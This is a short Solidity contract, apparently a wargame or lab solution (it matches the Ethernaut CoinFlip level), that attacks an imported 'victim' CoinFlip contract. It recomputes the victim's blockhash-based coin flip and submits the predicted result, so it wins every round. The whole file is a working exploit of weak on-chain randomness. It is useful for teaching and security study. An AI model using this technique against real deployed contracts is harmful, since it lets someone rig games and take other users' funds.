// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {CoinFlip} from "../victims/CoinFlip.sol";

contract AttackCoinFlip {
    CoinFlip victim;
    address public owner;
    uint256 public consecutiveWins;

    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _victim) {
        victim = _victim;
        owner = msg.sender;
        consecutiveWins = 0;
    }

    function attack() external {
        require(consecutiveWins < 10, "Attack already suceeded");

        callVictimWithFlip();
    }

    function callVictimWithFlip() internal {
        bool guess = makeGuess();
        bool success = victim.flip(guess);
        require(success, "Attack failed");
    }

    function makeGuess() internal returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
